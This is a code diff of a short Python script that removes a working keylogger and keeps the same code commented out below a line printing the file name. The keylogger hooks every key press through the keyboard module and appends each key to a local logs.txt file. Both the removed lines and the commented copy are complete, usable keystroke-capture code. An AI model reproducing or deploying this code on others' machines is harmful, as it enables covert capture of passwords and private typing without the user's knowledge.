@@ -1,22 +1,29 @@
-import keyboard #The keyboard module
+import os
 
-def writer(data):
-    with open("logs.txt","a") as file:
-        file.write(data)
+print(os.path.basename(__file__))
 
-def filter(char):
-	if char == "space":
-		return " "
-	elif len(char) > 1:
-		return "[%s]" % char
-	else:
-		return char
 
-def logger(event):
-	writer(filter(event.name))
 
-keyboard.on_press(logger)
-keyboard.wait()
+
+# import keyboard #The keyboard module
+
+# def writer(data):
+#     with open("logs.txt","a") as file:
+#         file.write(data)
+
+# def filter(char):
+# 	if char == "space":
+# 		return " "
+# 	elif len(char) > 1:
+# 		return "[%s]" % char
+# 	else:
+# 		return char
+
+# def logger(event):
+# 	writer(filter(event.name))
+
+# keyboard.on_press(logger)
+# keyboard.wait()
 
 
 
